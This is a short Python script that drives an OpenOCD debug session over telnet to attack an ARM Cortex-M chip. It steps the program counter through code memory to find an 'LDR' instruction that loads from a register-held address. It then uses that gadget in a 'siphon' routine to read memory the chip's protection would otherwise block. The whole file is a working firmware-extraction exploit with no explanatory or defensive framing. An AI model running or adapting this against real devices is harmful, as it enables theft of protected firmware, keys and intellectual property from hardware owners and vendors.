#!/usr/bin/python

import sys
import telnetlib

def halt(tn):
    tn.write("reset halt\n")
    tn.read_until("xPSR")
    tn.read_until("> ")

def reg_set_all(tn, val):
    for i in range(0, 13):
        tn.write("reg r" + str(i) + " " + str(val) + "\n")
        tn.read_until("> ")
    tn.write("reg sp " + str(val) + "\n")
    tn.read_until("> ")

def reg_get(tn, name):
    tn.write("reg " + name + "\n")
    tn.read_until(": ")
    val = int(tn.read_until("\n"), 0)
    tn.read_until("> ")
    return val

def reg_set(tn, name, val):
    tn.write("reg " + name + " " + str(val) + "\n")
    tn.read_until("> ")

def reg_dump(tn):
    tn.write("reg\n")
    tn.read_until("arm v7m registers")
    print tn.read_until("=====")

def step(tn):
    tn.write("step\n")
    tn.read_until("> ")

def siphon(tn, addr, pc, r_addr, r_dest):
    reg_set(tn, "pc", pc)
    reg_set_all(tn, 0)
    reg_set(tn, "r" + str(r_addr), addr)
    step(tn)
    return reg_get(tn, "r" + str(r_dest))


reg_cont = 0
search_length = 1024

tn = telnetlib.Telnet("localhost", 4444)

print("Halting target")
halt(tn)
pc = reg_get(tn, "pc")
print("Program counter is " + str(pc))
msp = reg_get(tn, "msp")
print("Program counter (banked) is " + str(msp))

pc_end = pc + (search_length * 4)
print("Testing pc from " + str(pc) + " up to " + str(pc_end))
for i in xrange(pc, pc_end, 4):
    halt(tn)
    print("Setting program counter to " + str(i))
    reg_set(tn, "pc", i)
    reg_set_all(tn, 0)
    step(tn)
    for j in range(0, 13):
        val = reg_get(tn, "r" + str(j))
        if val == msp:
            print("Found candidate: r" + str(j) + " == " + str(msp) + " (MSP)")
            for k in range(0, 13):
                if k != j:
                    reg_set(tn, "pc", i)
                    reg_set_all(tn, 0)
                    reg_set(tn, "r" + str(k), 4)
                    step(tn)
                    newval = reg_get(tn, "r" + str(j))
                    if newval != val:
                        print("Exploit found at pc=" + hex(i) + ": LDR R" + str(j) + ", [R" + str(k) + "]")
                        print("Code: " + hex(siphon(tn, i, i, k, j)))
                        sys.exit()

tn.write("exit\n")